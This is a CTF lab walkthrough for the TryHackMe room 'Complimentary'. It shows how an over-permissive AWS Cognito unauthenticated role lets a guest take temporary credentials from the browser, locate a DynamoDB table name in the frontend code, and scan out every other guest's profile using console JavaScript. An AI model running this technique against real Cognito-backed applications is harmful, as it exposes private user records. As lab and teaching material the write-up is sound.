# TryHackMe: Complimentary — Walkthrough & Solution

## 📌 Overview

- Room Name: Complimentary

- Category: Cloud Security / AWS

- Difficulty: Easy

- Key Vulnerability: AWS Cognito Identity Pool IAM Misconfiguration (Excessive Unauthenticated Role Permissions)

## 🔍 Vulnerability Analysis
The Byte Lotus Wellness web application grants immediate access to guests without requiring a login or registration screen. Behind the scenes, the web frontend leverages AWS Cognito Identity Pools to automatically issue temporary AWS credentials to unauthenticated visitors.

While issuing read-only guest access is a standard cloud architecture pattern, a security flaw occurs when the associated IAM role (Unauthenticated Role) grants overly broad permissions—specifically allowing dynamodb:Scan across tables without limiting scope to an individual identity ID.

## 🚀 Step-by-Step Exploitation
### Step 1: Identifying the AWS Credentials in Browser Storage
When inspecting the application via Developer Tools (F12) under the Application → Local Storage tab, two notable keys are populated:

*aws.cognito.identity-id.us-east-1:...*

*byteLotusGuestId*

Checking the console execution reveals that the AWS SDK running in the browser holds temporary AWS STS credentials (AccessKeyId, SecretAccessKey, and SessionToken).

```AWS.config.credentials```

### Step 2: Extracting identity details and IAM Role (Optional Verification)
To verify the permissions of the current session, we can invoke the AWS STS getCallerIdentity method directly from the browser's Developer Console:

JavaScript
```let sts = new AWS.STS();
sts.getCallerIdentity({}, function(err, data) {
  if (err) console.error(err);
  else console.log("Current Identity ARN:", data.Arn);
});
```
Result Output:

*arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials*

This confirms our current identity is operating under the complimentary-cognito-unauth-role.

### Step 3: Discovering the Target DynamoDB Table Name
Attempting to run a global table listing via *dynamodb.listTables()* returns an *AccessDeniedException* because *dynamodb:ListTables* is explicitly restricted.

However, frontend client applications must know which target table to query. Searching the application source code (Sources tab -> app.js or Ctrl + Shift + F) reveals the defined variable:

JavaScript

*const TABLE_NAME = "complimentary-GuestWellnessProfiles";*

### Step 4: Dumping Table Records (Exploiting Overly Permissive IAM Policy)
Because the IAM policy attached to the unauthenticated role grants global *dynamodb:Scan* privileges on *complimentary-GuestWellnessProfiles*, we can request all records from the table despite only being a guest user.

Execute the following snippet in the browser console:

JavaScript

```let docClient = new AWS.DynamoDB.DocumentClient();

docClient.scan({ TableName: 'complimentary-GuestWellnessProfiles' }, function(err, data) {
  if (err) {
    console.error(err);
  } else {
    console.log(JSON.stringify(data.Items, null, 2));
  }
});
```
## 🚩 Result & Flag
The scan response returns all guest profiles stored in DynamoDB, exposing other guests' sensitive records and revealing the challenge flag:

JSON
```
[
  {
    "guestId": "guest-v4n8c1pd",
    "name": "Lambo",
    "notes": "Standard guest profile"
  },
  {
    "guestId": "guest-99x2a001",
    "name": "Target Guest",
    "flag": "THM{********************************}"
  }
]
```
